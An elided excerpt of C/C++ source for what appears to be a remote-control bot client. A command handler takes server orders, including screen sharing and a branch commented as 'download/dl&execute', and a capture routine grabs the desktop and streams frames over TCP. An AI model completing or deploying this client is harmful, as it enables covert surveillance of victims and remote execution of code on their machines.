...
struct streamsettings
{
	...
	unsigned int fps;//change back to char
...
int recvfromthink()
{
	...
	if (type == 'j')//screenshare
	{
		...
		unsigned char quality = buf.ReadChar();
	...
	if (type == '1')// http update/download/dl&execute
	{
		...
		printf("Start DL: %s%s store: %s\n", httpdlcfg.addr, httpdlcfg.file, httpdlcfg.store);
...
void capturescreen(leynet_tcp *tcp)
{
	...
	if (!hdcMemDC)
	{
		MessageBox(0, "CreateCompatibleDC has failed", "Failed", MB_OK);
		goto done;
	}

	// Get the client area for size calculation
	RECT rcClient;
	SystemParametersInfo(SPI_GETWORKAREA, NULL, &rcClient, NULL);
	...
	if (!hbmScreen)
	{
		MessageBox(0, "CreateCompatibleBitmap Failed", "Failed", MB_OK);
		goto done;
	}
	...
	if (!BitBlt(hdcMemDC,
		...
		SRCCOPY))
	{
		MessageBox(0, "BitBlt has failed", "Failed", MB_OK);
		goto done;
	}
	...
	BITMAPINFOHEADER   bi; //just info about bitmap
	...
	char *lpbitmap = (char *)GlobalLock(hDIB);//the bitmap itself
	memcpy(lpbitmap, &bi, sizeof(BITMAPINFOHEADER));

	// Gets the "bits" from the bitmap and copies them into a buffer 
	// which is pointed to by lpbitmap.

	GetDIBits(hdcScreen, hbmScreen, 0, (UINT)bmpScreen.bmHeight, lpbitmap+sizeof(BITMAPINFOHEADER), (BITMAPINFO *)&bi, DIB_RGB_COLORS);
	...
	ADD_FRAME_FROM_DIB_TO_AVI(lpbitmap, "\0\0\0\0", 30, 10000);
	...
	{
		int b = (int)lpbitmap[i];
		int g = (int)lpbitmap[i + 1];
		int r = (int)lpbitmap[i + 2];
		int a = (int)lpbitmap[i + 3];
	...
	if (worked&&bufsize)
	{
		...
		send.WriteInt32(0x41417634);

		if (tcp->Send(sendbuf, send.GetPos()))//error while sending
		{
			streamcfg.height = 0;
...
int screensharethread()
{
	...
	streamcfg.waittime = 0;
	streamcfg.quality = 1;
	streamcfg.fps = 500;
	streamcfg.width = 1920;
	streamcfg.height = 1080;



	START_AVI("test.avi", streamcfg.width, streamcfg.height, streamcfg.fps);
	...
	while (true)
	{
		...
		if (streamcfg.fps > curframes&&!GetAsyncKeyState(VK_ESCAPE))
		{
			curframes++;
		}
		else {
